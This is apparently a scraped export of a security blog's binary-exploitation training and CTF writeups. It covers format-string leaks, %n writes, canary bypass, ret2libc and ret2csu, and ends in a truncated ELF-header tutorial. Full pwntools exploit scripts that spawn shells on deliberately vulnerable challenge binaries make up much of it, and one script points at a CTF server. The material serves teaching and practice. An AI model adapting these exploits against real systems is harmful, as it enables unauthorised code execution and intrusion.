the shot variable and see what out put we are getting.\np = start() p.recvline() p.sendline(\u0026#34;%p \u0026#34;*(0x60)) p.interactive() Do you see a lot of garbage ? Along with that do you see some amazing addresses ?\nExactly, the address 0x0000555555555222 is the start of main. So we have overcome the problem of PIE, since we know a address in the binary, we can calculate the relative offsets of other functions as well. Lets see what helper function we are provided with now.\nROP: # A win function: this will call execve(\u0026quot;/bin/sh\u0026quot;), its a ROP challenge and I am pretty sure you know how to do it. There is a small catch here. We have to calculate the relative offset of the addresses since PIE is enabled, so manually calculate the distance of the gadgets and the win function.\np = start() p.recvline() p.sendline(\u0026#34;%p \u0026#34;*(27)) l = p.recvline().split() leaked_main = int(l[-1], 16) win_func = leaked_main - (0x555555555222-0x5555555551c8) binary_start = leaked_main - (0x555555555222-0x555555554000) log.info(\u0026#34;Leaked main address: \u0026#34; + str(l[-1])) log.info(\u0026#34;win function: \u0026#34;+ str(win_func)) log.info(\u0026#34;Binary Start: \u0026#34;+ str(leaked_main - (0x555555555222-0x555555554000))) p.interactive() Here, I found out that the 27th position, the address of main is printed so I put all the leaked stuff into a list (You can just strip it and store the main address value too). Next I manaually subtract the offset and add it to get the address from the leaked value. Also just to be sure everything is correct, I log all the info I get and verify them in gdb.\nNow its simple, just call the win function with its argument set to 0xdeadbeefcafebabe (RDI).\nFull Exploit:\n#!/usr/bin/env python3 from pwn import * # Set up pwntools for the correct architecture context.update(arch=\u0026#39;amd64\u0026#39;) exe = \u0026#39;./ret2win_pie\u0026#39; elf = ELF(\u0026#34;ret2win_pie\u0026#34;) def start(argv=[], *a, **kw): \u0026#39;\u0026#39;\u0026#39;Start the exploit against the target.\u0026#39;\u0026#39;\u0026#39; if args.GDB: return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw) else: return process([exe] + argv, *a, **kw) gdbscript = \u0026#39;\u0026#39;\u0026#39; b* main+67 continue \u0026#39;\u0026#39;\u0026#39;.format(**locals()) #=========================================================== # EXPLOIT GOES HERE #=========================================================== p = start() p.recvline() p.sendline(\u0026#34;%p \u0026#34;*(27)) l = p.recvline().split() leaked_main = int(l[-1], 16) win_func = leaked_main - (0x555555555222-0x5555555551c8) binary_start = leaked_main - (0x555555555222-0x555555554000) log.info(\u0026#34;Leaked main address: \u0026#34; + str(l[-1])) log.info(\u0026#34;win function: \u0026#34;+ str(win_func)) log.info(\u0026#34;Binary Start: \u0026#34;+ str(leaked_main - (0x555555555222-0x555555554000))) p.sendline(b\u0026#34;A\u0026#34;*0x60 + b\u0026#34;B\u0026#34;*8 + p64(binary_start+0x00000000000012eb) + p64(0xdeadbeefcafebabe) + p64(win_func)) p.interactive() Hope you guys enjoyed the pwn training 2 more amazing challenges are yet to come !! Happy hacking.\n","date":"2024-01-06","externalUrl":null,"permalink":"/training/1728229152748-format-string-exploitation-train-2/","section":"Pwn Training","summary":"\u003cp\u003eThis is the 2nd challenge in the in the series. In this training we will go through the format string exploitation technique. We are provided 2 challenges of the same vulnerability. Lets go through them one by one.\u003c/p\u003e","title":"Format String Exploitation [train 2]","type":"training"},{"content":"In this blog we will be trying to leak a libc address and try to get a shell by calling system. Here we will look into 2 challenges with similar attacks but slight variations.\nChallenge 1: # Here we are given a binary and the source for the binary.\nvuln binary and vuln c code\nSolution: # Mitigations: # Lets check out the mitigations for this program.\nchecksec --file ./ret2libc If you don\u0026rsquo;t have checksec installed then\nsudo apt install checksec RELRO:\nPartial RELRO - the got is writeable, nothing much to bother here. CANARY:\nNo canary, we can do a overflow peacefully :) No eXecute:\nNX Enabled - this makes sure that the code on the stack is not excecuted. PIE:\nPIE Disabled, we know the address of all the code in the binary. Code walkthrough: # main function:\nSince gets is a vulnerable function, we can use it to write more data than what the buffer can hold. Also there are no win functions this time. We have to rely on the shared object. Lets explore this challenge now. Global Offset Table: # This challenge requires you to know the basics of GOT and PLT. In short GOT is a set of address that points to the function in the glibc (shared library). To know more about Global offset table go ahead to my old blog.\nExploit Idea: # Our aim right now is to leak an address in the libc (shared library). Since ASLR will randomise the library we cant access the libc function with same address all the time. There is a function called system in the libc which will pop a shell if we give the address of /bin/sh as the parameter. → We can use the puts function to call the got of puts, since its already called by our program, the GOT of this function will be resolved ( real address pointing to libc will be filled ).\nPseudo code: # note: arguments to functions are stored via registers, the first argument is stored in RDI.\n\u0026#34;A\u0026#34;*(offset) + p64(address of pop RDI) + p64(GOT address of puts) + p64(PLT address of puts) + p64(address of main) This code will fill the buffer with garbage and store the GOT address of puts inside the RDI register and then calls puts, this will leak the puts libc address.\nNow we have the libc puts address. All functions and variables in the libc is relative to one another, libc as a whole might change its position but the elements (functions, variables) will be at the same relative distance from one another. we can calculate the address of string \u0026ldquo;/bin/sh\u0026rdquo; and the address of system function, then we can call the system with the argument to pop a shell. note: You might face a error in the statement movabs. If you encounter this problem, you can rectify it by adding a return instruction before the call to a glibc function, Since adding a return address will make the RSP 16 byte aligned.\nExploit: # In real life situation you are not probably using the same libc as the software dev, So to find out the libc version go to libc.blukat.me.\nSo always the last 3 digits (hex) of the leak will be same. Use this as an advantage to select your libc version.\nBelow is the commented solution.\n#!/usr/bin/env python3 from pwn import * # Set up pwntools for the correct architecture context.update(arch=\u0026#39;amd64\u0026#39;) exe = \u0026#39;./ret2libc\u0026#39; elf = ELF(\u0026#34;./ret2libc\u0026#34;) # ./exploit.py DEBUG NOASLR def start(argv=[], *a, **kw): \u0026#39;\u0026#39;\u0026#39;Start the exploit against the target.\u0026#39;\u0026#39;\u0026#39; if args.GDB: return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw) else: return process([exe] + argv, *a, **kw) # ./exploit.py GDB gdbscript = \u0026#39;\u0026#39;\u0026#39; b* 0x00000000004011c7 \u0026#39;\u0026#39;\u0026#39;.format(**locals()) #=========================================================== # EXPLOIT GOES HERE #=========================================================== p = start() p.recvuntil(\u0026#34;Are you in?\u0026#34;) # recv the output sent by the program. p.sendline(b\u0026#34;A\u0026#34;*0x60 + b\u0026#34;B\u0026#34;*8 + p64(0x0000000000401016) + p64(0x000000000040122b) + p64(elf.got[\u0026#39;puts\u0026#39;]) + p64(elf.plt[\u0026#39;puts\u0026#39;]) + p64(elf.sym.main)) # filling the buffer and RBP + return instruction to tackle the alignment issues + pop RDI to fill it with address of the puts function. add main to return back to main function p.recvline() # recv unwanted bytes. leak_puts =hex( u64((p.recvline().rstrip()).ljust(8, b\u0026#34;\\x00\u0026#34;))) # recv the puts function and strip the front and back, unpack it and store it as hex. log.info(\u0026#34;puts: \u0026#34;+str(leak_puts)) # make sure you get a address in the libc by logging it. p.recvuntil(\u0026#34;Are you in?\u0026#34;) # recv output. p.sendline(b\u0026#34;B\u0026#34;*0x60 + b\u0026#34;C\u0026#34;*8 + p64(0x000000000040122b) + p64(int(leak_puts, 16) + 0x13000a) + p64(int(leak_puts, 16)-0x32190)) # fill garbage in buffer and pop RDI to fill it with a pointer to \u0026#34;bin/sh\u0026#34; call system. p.interactive() Challenge 2: # In this second challenge you are required to perform the same ret2libc but with more security measures to bypass. Below you can download source and bianry.\nvuln binary and vuln c code\nSolution: # Lets do the drill of checking the mitigations.\nMitigations: # Canary:\nA set of characters that will be checked before returning. If the value has changed the program aborts. No eXecute:\nNX Enabled - this makes sure that the code on the stack is not excecuted. PIE:\nPIE Enabled, We dont know the address of the code for the binary. Code Walkthrough: # There is only a main function. We can see that, here we are getting an input and printing it in an unsafe way. Here we can take advantage of this to leak data in the binary. Not sure about format string ? Go Here. In the next section we can use the gets function to input more data than the buffer can store.\nCanary: # Set of characters that is placed in between the return address and the buffer. When a buffer overflow occurs the canary checks itself with a memory copy. If the values has been modified then we know a overflow happened and the program will abort.\nBypass: Basically we can leak the canary from format strings and place the canary in the correct spot in the payload. Since we over write the canary with the real canary, it seems there was no overflow.\nExploit: # Lets try to leak some variables from the stack by giving some %p. We can store all of them in a list and analyse what is what. p = start() # phase 1 : leaking binary and libc address p.sendlineafter(\u0026#34;So you wanna try again. Go ahead :)\u0026#34;, b\u0026#34;%p \u0026#34;*25) all_leaked = str(p.recvline()).split() log.info(\u0026#34;Info leaked: \u0026#34; + str(all_leaked)) We can confirm that the address 0x7ffff7faea03 is from the libc, nice ! we already got a leak. Attach gdb and check what the address corresponds to. Ok this is a libc function, we can calculate the offset of this function from the libc base. Now lets see if any other important info is leaked. :thinking:\nAddress that is 0x5555555550a0, is a address that is winthin the binary, we can calculate the offset like the previous one.\nFinally lets see if the canary is also included in the stack. Yes it is indeed inside the stack and can clearly see it.\nNow to find the position of canary we can set a break point in the address before the __stack_chk_fail@plt. The stack will be stored in the RCX register. Create a offset pattern then see what value is in the RCX register and place the canary value there to complete the exploit.\nNow it is simple. We can simply calculate all the relative offset from the base of binary and libc, So we can now pop rdi to populate it with the address of /bin/sh and call system. Below I have given the commented solution.\n#!/usr/bin/env python3 from pwn import * # Set up pwntools for the correct architecture context.update(arch=\u0026#39;amd64\u0026#39;) exe = \u0026#39;./ret2libc_canary\u0026#39; elf = ELF(\u0026#34;./ret2libc_canary\u0026#34;) libc = ELF(\u0026#34;/lib/x86_64-linux-gnu/libc.so.6\u0026#34;) # ./exploit.py DEBUG NOASLR def start(argv=[], *a, **kw): \u0026#39;\u0026#39;\u0026#39;Start the exploit against the target.\u0026#39;\u0026#39;\u0026#39; if args.GDB: return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw) else: return process([exe] + argv, *a, **kw) # ./exploit.py GDB gdbscript = \u0026#39;\u0026#39;\u0026#39; b* main+164 \u0026#39;\u0026#39;\u0026#39;.format(**locals()) #=========================================================== # EXPLOIT GOES HERE #=========================================================== p = start() # phase 1 : leaking binary and libc address p.sendlineafter(\u0026#34;So you wanna try again. Go ahead :)\u0026#34;, b\u0026#34;%p \u0026#34;*25) # send format specifier to leak data from the stack p.recvline() # recv the new line. all_leaked = str(p.recvline()).split() # store all leaked data as a list. log.info(\u0026#34;Info leaked: \u0026#34; + str(all_leaked)) # log it to make sure everything works fine libc_base = int(str(all_leaked[0])[2:], 16) - 2013699 # take the first element in the list which is a libc function. log.info(\u0026#34;Libc Base: \u0026#34;+ str(hex(libc_base))) # log it binary_base = int(str(all_leaked[-6])[2:], 16) - 4256 # calculate the binary offset from the leak. log.info(\u0026#34;binary_base: \u0026#34; + str(hex(binary_base))) # log it canary = int(str(all_leaked[-4])[2:], 16) # store the canary from the leak # pahse 2 : usign the leak to ret2libc buf = b\u0026#34;A\u0026#34;*(0x60+8) + p64(canary) # fill the buffer till the canary and overwrite the canary with real one. buf += p64(binary_base+0x0000000000001016) # random garbage to fill the rbp buf += p64(binary_base+0x00000000000012cb) # return address print(next(libc.search(b\u0026#39;/bin/sh\\x00\u0026#39;))) # find the address of libc bin/sh buf += p64(libc_base + next(libc.search(b\u0026#39;/bin/sh\\x00\u0026#39;))) buf += p64(binary_base+0x0000000000001016) # return to make sure stack is aligned before a glibc call buf += p64(libc_base + libc.sym.system) # call system. p.sendlineafter(\u0026#34;Missed again??? I\u0026#39;m so disappointed.\u0026#34;, buf) p.interactive() Hope you loved this challenge in the training !Happy Hacking! :D\n","date":"2024-01-05","externalUrl":null,"permalink":"/training/1728229192015-ret-to-libc-train-3/","section":"Pwn Training","summary":"\u003cp\u003eIn this blog we will be trying to leak a libc address and try to get a shell by calling system. Here we will look into 2 challenges with similar attacks but slight variations.\u003c/p\u003e","title":"Ret-to-libc [train 3]","type":"training"},{"content":"Congrats on reaching this level. This level acts as a checkpoint (name suggests). You will be combining the idea of format strings, buffer overflows, canaries from previous blogposts. Try this level on your own and check for hints when stuck.\nChallenge: # Download below challenge file.\nFILES\nSolution: # Mitigations: # No need to explain mitigations right ? These are different protections created to rule out certain types of attacks, make hackers life a little harder.\nCode Walkthrough: # We are given the c code. Here in the main program, there is a while loop to run the format string vulnerability and finally a compare statement leading to a fgets call.\nSample run: # Runing the file tells us there is a format string exploit. Exploit idea: # Here the challenge is direct and was made to recap what we learnt in the previous blogs. The attack plan is\nleaking a binary address, libc address, canary. make the strength variable = \u0026ldquo;STRENGTH\u0026rdquo; increase the size variable to a much larger value for a buffer overflow. (tricky part) Format string exploit: # We already know what format strings are\u0026hellip; now leak the stack little by little and see what useful values you get. I got the following values:\n16: my input 49: canary 51: a libc address 56: a binary address Now you got the values so calculate the address relatively with the binary/libc or initialise the binary and libc as elf with the help of pwntools ELF() function.\n#Need to know the libc. (used by default libc for local purpose) elf.address = int((str(leak[2])[4:-3]), 16) - elf.sym.__libc_csu_init libc.address = int((str(leak[1])[4:-1]), 16) - 159923 canary = int((str(leak[0])[4:-1]), 16) #My weird way of receiving and splitin. Formats again: # The second task was to change the value of the global variables and make it favourable for us.\nfmt = fmtstr_payload(16, { elf.sym.size: 500, elf.sym.strength: u64(b\u0026#34;STRENGTH\u0026#34;), }) Here I am making the size variable much larger than buffer size, making strength variable equal to \u0026ldquo;STRENGTH\u0026rdquo; to pass the check.\nBuffer Overflow: # Finally you do a bit of fiddling to get the correct offset of the stack canary and overwrite with the leaked canary, then simply do a ret2libc.\nExploit: # from pwn import * exe = \u0026#39;./checkpoint\u0026#39; context.binary = elf = ELF(exe) libc = \u0026#34;/usr/lib/x86_64-linux-gnu/libc.so.6\u0026#34; if(libc != \u0026#34;\u0026#34;): libc = ELF(libc) def start(argv=[], *a, **kw): if args.GDB: return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw) else: return process([exe] + argv, *a, **kw) gdbscript = \u0026#39;\u0026#39;\u0026#39; b* main \u0026#39;\u0026#39;\u0026#39;.format(**locals()) #=========================================================== # EXPLOIT GOES HERE #=========================================================== \u0026#39;\u0026#39;\u0026#39; NOTES: 16: my input 49: canary 51: a libc address 56: a binary address \u0026#39;\u0026#39;\u0026#39; p = start() p.recv() p.sendline(b\u0026#34;%49$p-%51$p-%56$p\u0026#34;) leak = p.recvline().split(b\u0026#34;-\u0026#34;) elf.address = int((str(leak[2])[4:-3]), 16) - elf.sym.__libc_csu_init libc.address = int((str(leak[1])[4:-1]), 16) - 159923 canary = int((str(leak[0])[4:-1]), 16) log.info(f\u0026#34;elf base: {hex(elf.address)}\u0026#34;) log.info(f\u0026#34;libc base: {hex(libc.address)}\u0026#34;) fmt = fmtstr_payload(16, { elf.sym.size: 500, elf.sym.strength: u64(b\u0026#34;STRENGTH\u0026#34;), }) p.recv() p.sendline(b\u0026#34;y\u0026#34;) p.send(fmt) p.recv() p.sendline(b\u0026#34;$p\u0026#34;) p.sendline(b\u0026#34;n\u0026#34;) p.sendline(b\u0026#34;A\u0026#34;*0x158 + p64(canary) + p64(0) + p64(elf.address + 0x1016) + p64(elf.address+0x151b)+ p64(next(libc.search(b\u0026#39;/bin/sh\u0026#39;))) + p64(libc.sym.system)) p.interactive() This was short and crisp since all these topics are already covered in the rest of the blogs. Happy Hacking.\n","date":"2024-01-04","externalUrl":null,"permalink":"/training/1728229207308-checkpoint-train-4/","section":"Pwn Training","summary":"\u003cp\u003eCongrats on reaching this level. This level acts as a checkpoint (name suggests). You will be combining the idea of format strings, buffer overflows, canaries from previous blogposts. Try this level on your own and check for hints when stuck.\u003c/p\u003e","title":"Checkpoint [train 4]","type":"training"},{"content":"This contains most of the basic stack based exploitation techniques and challenges, I solved. They are mostly x86 64 bit excecutables.\n","date":"2024-01-03","externalUrl":"https://github.com/tourpran/pwn-hub/tree/main/basic_attacks","permalink":"/training/1728287101851-basic-stack-exploitation/","section":"Pwn Training","summary":"This contains most of the basic stack based exploitation techniques and challenges, I solved.","title":"Basic - Stack Exploitation","type":"training"},{"content":"These are some of the hard heap challenges I encountered in various CTFs. They are structured, so you only have to work hard and tackle them.\n","date":"2024-01-02","externalUrl":"https://github.com/tourpran/pwn-hub/tree/main/Heap","permalink":"/training/1728287138127-advanced---heap-exploitation/","section":"Pwn Training","summary":"These are some of the hard heap challenges I encountered in various CTFs.","title":"Advanced - Heap Exploitation","type":"training"},{"content":"This is my current area of research. I look mostly into v8, which is chrome browser\u0026rsquo;s Javascript Engine. This contains cves and related topic.\n","date":"2024-01-01","externalUrl":"https://github.com/tourpran/pwn-hub/tree/main/v8-exp","permalink":"/training/1728287157117-expert---browser-exploitation/","section":"Pwn Training","summary":"This is my current area of research.","title":"Expert - Browser Exploitation","type":"training"},{"content":"This is a basic ROP Challenge that involves a technique called the ret2csu. We use this when there is a lack of gadgets.\nChallenge Description # Solution: # Checkout the mitigations of the binary Try to find gadgets since this is a ROP challenge. If you dont know much about ROP checkout ROPemporium. Craft the payload to get flag from server. Mitigations: # We can\u0026rsquo;t excecute shellcode (NX Enabled) No Canary found - no need for brute force or leaks PIE disabled - the address of the binary wont be randomised Finding Gadgets: # Install ROPgadget to find all the gadgets in the binary.\nROPgadget --binary babyrop My first thought was to write the address pointed by the got of write. The idea was to leak the address of write function. Since write has already been called by the program the GOT of write will be populated and the got will point to the libc address of write. The following gadgets are needed.\npop rdi pop rsi pop rdx I did not have the pop rdx register which makes the challenge a bit more intresting. So we need to find a way to set the value of RDX, RSI, RDI.\nrsi - point to the buffer [write@got] rdi - file discriptor = 1 rdx - size of the buffer = \u0026gt;8 Since ropgadget did not give me the gadget I went to look for more gadgets in the __libc_csu_init. There I could find all the gadgets I wanted.\nCrafting Exploit: # These are the important gadgets I want.\nIdea # First overflow the buffer with garbage and then make return jump to csu. Things to note.\n0x00000000004011b0 \u0026lt;+64\u0026gt;:\tmov rdx,r14 0x00000000004011b3 \u0026lt;+67\u0026gt;:\tmov rsi,r13 0x00000000004011b6 \u0026lt;+70\u0026gt;:\tmov edi,r12d 0x00000000004011ca \u0026lt;+90\u0026gt;:\tpop rbx 0x00000000004011cb \u0026lt;+91\u0026gt;:\tpop rbp 0x00000000004011cc \u0026lt;+92\u0026gt;:\tpop r12 0x00000000004011ce \u0026lt;+94\u0026gt;:\tpop r13 0x00000000004011d0 \u0026lt;+96\u0026gt;:\tpop r14 0x00000000004011d2 \u0026lt;+98\u0026gt;:\tpop r15 0x00000000004011d4 \u0026lt;+100\u0026gt;:\tret Now we can control the RDI, RSI, RDX because we can control the r14, r13, r12 registers. Intresting area was the call to QWORD PTR [r15+rbx*8] inbetween these gadgets. So we decided to make this QWORD PTR [r15+rbx*8] as the write function. In order to do this well set r15 as the address to write@got and rbx as 0.\n0x00000000004011b9 \u0026lt;+73\u0026gt;:\tcall QWORD PTR [r15+rbx*8] 0x00000000004011bd \u0026lt;+77\u0026gt;:\tadd rbx,0x1 0x00000000004011c1 \u0026lt;+81\u0026gt;:\tcmp rbp,rbx 0x00000000004011c4 \u0026lt;+84\u0026gt;:\tjne 0x4011b0 \u0026lt;__libc_csu_init+64\u0026gt; Hmmm :(. Seems like there is a compare statement that\u0026rsquo;ll make us jump back to the csu+64 (which is somewhere in the middle of csu). Now lets make rbp as 1 so we dont take the jump.\nbuf = b\u0026#34;a\u0026#34;*72 buf += p64(0x00000000004011ca) #rbx rbp r12 r13 r14 r15 buf += p64(0)+p64(1)+p64(1)+p64(elf.got[\u0026#39;write\u0026#39;])+p64(8)+p64(elf.got[\u0026#39;write\u0026#39;]) buf += p64(0x00000000004011b0) buf += p64(0)*7 buf += p64(elf.sym[\u0026#39;main\u0026#39;]) Exploit for leaking libc write address looks something like this. :) Now lets just recv the leak and see what libc they are using. To find out their libc go to libc.blukat.me\nNow its basic math, since all the address in the libc will be at the same offset from one another. Once you get the leak just find address of /bin/sh and system then just call system with /bin/sh as argument. Pretty intresting challenge and fun to solve :).\nAnyway here is the exploit script for this challenge.\n#!/usr/bin/env python3 from pwn import * # Set up pwntools for the correct architecture context.update(arch=\u0026#39;i386\u0026#39;) exe = \u0026#39;./babyrop\u0026#39; elf = ELF(\u0026#34;./babyrop\u0026#34;) def start(argv=[], *a, **kw): if args.GDB: return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw) else: return process([exe] + argv, *a, **kw) # ./exploit.py GDB gdbscript = \u0026#39;\u0026#39;\u0026#39; continue \u0026#39;\u0026#39;\u0026#39;.format(**locals()) #=========================================================== # EXPLOIT GOES HERE #=========================================================== p = remote(\u0026#34;dicec.tf\u0026#34;, 31924) # shellcode = asm(shellcraft.sh()) \u0026#39;\u0026#39;\u0026#39; 0x00000000004011d3 : pop rdi ; ret write syscall rdi = 1 rsi = pointer to puffer (pointer to write function) rdx = size \u0026#39;\u0026#39;\u0026#39; p.recvuntil(\u0026#34;: \u0026#34;) buf = b\u0026#34;a\u0026#34;*72 buf += p64(0x00000000004011ca) #rbx rbp r12 r13 r14 r15 buf += p64(0)+p64(1)+p64(1)+p64(elf.got[\u0026#39;write\u0026#39;])+p64(8)+p64(elf.got[\u0026#39;write\u0026#39;]) buf += p64(0x00000000004011b0) buf += p64(0)*7 buf += p64(elf.sym[\u0026#39;main\u0026#39;]) p.sendline(buf) # log.info(\u0026#34;write leak: {}\u0026#34;.format((hex(u64(p.recv(8)))))) leak = int(hex(u64(p.recv(8))), 16) log.info(\u0026#34;Write leak: {}\u0026#34;.format(hex(leak))) sys = leak-0xbbdc0 binsh = leak+0xa63da buf = b\u0026#34;a\u0026#34;*72 buf += p64(0x40116b) #ret buf += p64(0x00000000004011d3) #pop rdi buf += p64(binsh) buf += p64(sys) p.sendline(buf) p.interactive() ","date":"2021-10-04","externalUrl":null,"permalink":"/writeups/1728230824684-babyrop-dicegang-ctf/","section":"Writeups","summary":"\u003cp\u003eThis is a basic ROP Challenge that involves a technique called the ret2csu. We use this when there is a lack of gadgets.\u003c/p\u003e","title":"babyROP [DiceGang CTF]","type":"writeups"},{"content":"","date":"2021-10-04","externalUrl":null,"permalink":"/tags/csu/","section":"Tags","summary":"","title":"Csu","type":"tags"},{"content":"","date":"2021-10-04","externalUrl":null,"permalink":"/tags/dicegang/","section":"Tags","summary":"","title":"Dicegang","type":"tags"},{"content":"","date":"2021-10-04","externalUrl":null,"permalink":"/tags/ret2csu/","section":"Tags","summary":"","title":"Ret2csu","type":"tags"},{"content":"","date":"2021-09-06","externalUrl":null,"permalink":"/tags/format-string/","section":"Tags","summary":"","title":"Format String","type":"tags"},{"content":"Played InCTFj Quals this winter vacation. It was a fun filled ctf. Here we will discuss the pwn challenge called leaky pipes. Make sure to give the challenge a try before seeing this.\nChallenge file: # vuln binary and vuln c code\nPre requisites: # Basic understanding of how computers work. Know what format strings are. will to learn more from googling. Mitigations: # Most of the format string exploitation will have all the mitigations enabled. RELRO: GOT related stuff. Stack Canary: unique value stoping buffer overflow. NX: Makes the stack not excecutable. PIE: the binary will have different address during different runs. Sample run: # Lets simply run the binary, while doing this make sure to read the c code and get comfortable with the binary as a whole.\nWe can give three options (1, 2, 3) but 2 options doesnt do anything. option 1: Give an input and get same output back from the printf function. option 3: Currently unavailable since we dont have enough cash. Exploit Basics: # Format string exploitation occurs when you use the printf function carelessly. Correct Usage of printf will be to use the format strings/ format specifiers in the first part and all the parameters in the 2nd part.\nprintf(\u0026#34;my name is : %s\\n\u0026#34;, \u0026#34;giovanni giorgio\u0026#34;); Problem occurs when attackers are given access to these format strings part. So as an attacker he can specify formats which will try to retrieve values that are not specified, hence will take values from the stack. Incorrect usage.\nprintf(buffer); //buffer = user input Exploit Idea: # We have to somehow go to the use_tape() Since it has our flag and another format string exploit.\nvoid use_tape(){ char experience[50]; char flag[50]; FILE *fp; fp = fopen(\u0026#34;flag.txt\u0026#34;, \u0026#34;rb\u0026#34;); if(fp != NULL){ fgets(flag, 50, fp); fclose(fp); printf(\u0026#34;Please give us your feedback!\\n\u0026#34;); fgets(experience, 50, stdin); printf(experience); exit(0); } else{ printf(\u0026#34;Error opening file!\\n\u0026#34;); exit(1); } But the small caviat is we can\u0026rsquo;t go there directly we somehow have to increase our balance from 100 to 200 (exactly) and then call buy_repair_kit().\nvoid buy_repair_kit(){ if(bal == 200){ use_tape(); } else{ printf(\u0026#34;You do not have enough balance! :(\\n\u0026#34;); } } Format string 1: # First I leak the entire stack(useful range) with the help of %p (gives the hexadecimal value of what is in the stack).\np.sendline(b\u0026#34;-%p\u0026#34;*50) leak = p.recvline() leak = leak.split(b\u0026#34;-\u0026#34;) Sending many %p with the \u0026lsquo;-\u0026rsquo; acting as a delimiter between all the values leaked from the stack. (easy to split and put them in a list). If we play around with this then we notice that some of the values from the leaked data is similar to the binary\u0026rsquo;s address. Checking the VA space, we find that the value leaked from the %p was indeed from the binary. (underlined)\nfact to know: When PIE is enabled the entire binary changes its place but the relative address of functions and variables remain same.\nPick one of the address that you like which is in the range of the binary and calculate the offset between this address and the bal variable. I took the 21st index as the leak and calculate the offset between bal and leak(10974).\nbaladd = int(leak[21], 16)+10974 log.info(f\u0026#34;bal address: {hex(baladd)}\u0026#34;) Format string 2: # Well! part 1/3 is over and it was just the easy part. Now comes the tricky part, I wasted hours trying to find a way to make the bal variable = 200. Finally I came upon a solution after hours of googling. I call the leak function and give the string to overwrite the bal variable.\np.sendline(b\u0026#34;%99c%9$n%90c%9$n%11c%9$n\u0026#34; + p64(baladd)) Let me explain in parts what it does.\nWhile doing a format string exploit to overwrite a variable or a function address\u0026hellip; Check where your input is appearing and keep note of the index.\nHere my string of AAAAAAAA repeats in the index 6. Now its just a matter of overwriting the variable. But\u0026hellip; wait. How to overwrite ? we sure dont have no buffer overflow, can printf be used to overwrite ? da flick ?\nYes! The format specifier %n will write the number of bytes read till now into the address specified. So things become simple, Just put 200 bytes put the address of the variable, so the value of 100 will change to 200. Is it that simple ? kinda yes. One more caviat is only 8 bytes are read and excecuted by the program at a time, So we slowly build up the no of bytes and the put the value into specifc address.\n%[pad]c%[number]$n - would write that many `pad` of padding at the 9th offset in the leaked value. p.sendline(b\u0026#34;%99c%9$n%90c%9$n%11c%9$n\u0026#34; + p64(baladd)) #(c = character, $n = to write) Above I have added (99+90+11) which gives 200 into 9th offset since the p64(baladd) will place the address of baladd in the 9th index from start.\nFormat string 3: # Great job guys! Final part is damn simple just call the buy_repair_kit() function which now satify bal == 200 and call use_tape(), Here the flag is opened and just read into the stack followed by an unsafe printf leading to format string exploitation. Just leak most of the stack and get the flag. GG\nFull Exploit Script: # #!/usr/bin/env python3 from pwn import * context.update(arch=\u0026#39;x86\u0026#39;) exe = \u0026#39;./chall\u0026#39; elf = ELF(\u0026#34;./chall\u0026#34;) def start(argv=[], *a, **kw): \u0026#39;\u0026#39;\u0026#39;Start the exploit against the target.\u0026#39;\u0026#39;\u0026#39; if args.GDB: return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw) else: return process([exe] + argv, *a, **kw) gdbscript = \u0026#39;\u0026#39;\u0026#39; continue \u0026#39;\u0026#39;\u0026#39;.format(**locals()) #=========================================================== # EXPLOIT GOES HERE #=========================================================== p = start() # p = remote(\u0026#34;gc1.eng.run\u0026#34;, 32309) #Leaking the bal variable address p.recv() p.sendline(b\u0026#34;1\u0026#34;) p.recvuntil(b\u0026#34;like to check your leaks?\u0026#34;) p.sendline(b\u0026#34;-%p\u0026#34;*50) p.recvline() leak = p.recvline() leak = leak.split(b\u0026#34;-\u0026#34;) baladd = int(leak[21], 16)+10974 log.info(f\u0026#34;bal address: {hex(baladd)}\u0026#34;) #Over write bal with 200 to bypass the check p.sendline(b\u0026#34;1\u0026#34;) p.recv() p.sendline(b\u0026#34;%99c%9$n%90c%9$n%11c%9$n\u0026#34; + p64(baladd)) p.recv() #Leak the flag from the stack since its opened p.sendline(b\u0026#34;3\u0026#34;) p.recvuntil(b\u0026#34;feedback!\u0026#34;) p.sendline(b\u0026#34;%16$p-%17$p-%18$p-%19$p-%20$p-%21$p-%22$p\u0026#34;) p.recvline() #Change the hex flag to ascii flag = p.recvline().split(b\u0026#34;-\u0026#34;) final = \u0026#34;\u0026#34; for hexval in flag: try: final += (str(bytes.fromhex(str(hexval)[4:-1]).decode(\u0026#39;utf-8\u0026#39;))[::-1]) except: continue final += \u0026#34;ng!!}\u0026#34; log.info(f\u0026#34;flag: {final}\u0026#34;) p.interactive() Happy Hacking!\n","date":"2021-09-06","externalUrl":null,"permalink":"/writeups/1728230839404-leaky-pipes-inctfj-quals/","section":"Writeups","summary":"\u003cp\u003ePlayed InCTFj Quals this winter vacation. It was a fun filled ctf. Here we will discuss the pwn challenge called \u003ccode\u003eleaky pipes\u003c/code\u003e. Make sure to give the challenge a try before seeing this.\u003c/p\u003e","title":"Leaky Pipes [inCTFj Quals]","type":"writeups"},{"content":" Try solving these challenge on your own, and use this guide only when needed. If you want more challenges you can search in (pwn-hub) basic attacks ","date":"2020-09-10","externalUrl":null,"permalink":"/posts/","section":"Blog Posts","summary":"Try solving these challenge on your own, and use this guide only when needed.","title":"Blog Posts","type":"posts"},{"content":"","date":"2020-09-10","externalUrl":null,"permalink":"/tags/elf/","section":"Tags","summary":"","title":"ELF","type":"tags"},{"content":"So the ELF or Excecutable and Linkable format are programs or binaries that are used in linux systems. ELFs contain 3 components namely:\nELF Headers ELF Segments ELF Sections Need: # A good reason to learn ELF format is it helps you to understand things easily when you do binary analysis or when you are curious to know how the Operating System works. There are several reasons why you need to know them \u0026hellip;\nELF Headers # Firstly we will be looking at ELF which are 64 bits, dynamically linked, not stripped. Lets look at the ELF header with readelf.\nreadelf -h binary magic # We can see from the image that our header / binary starts with the magic bytes Magic: 45 4c 46 which corresponds to ELF in ascii. This magic bytes tell the file command that this is an Excecutable and Linkable Format.\nClass # This binary has a class of 64 bits because when I compiled, it was in a 64 bit machine so by default it will be 64 bits. Inorder to compile a 32 bit binary we need to give the -m32 flag to gcc.\nData # Little Endian Big Endian The bytes of a word are arranged from right to left The bytes of a word are arranged from left to right The address of the word (assume 4 bytes) will point to 4 th bytes The address of that word (assume 4 bytes) will point to the 1st bytes So in our case its little endian and most 64 bit amd processors compile it in little Endian.\nOS/ABI # Nothing to tell about OS (Operating System). I compiled this is my laptop which is Linux hence Unix.\nMachine # Tells 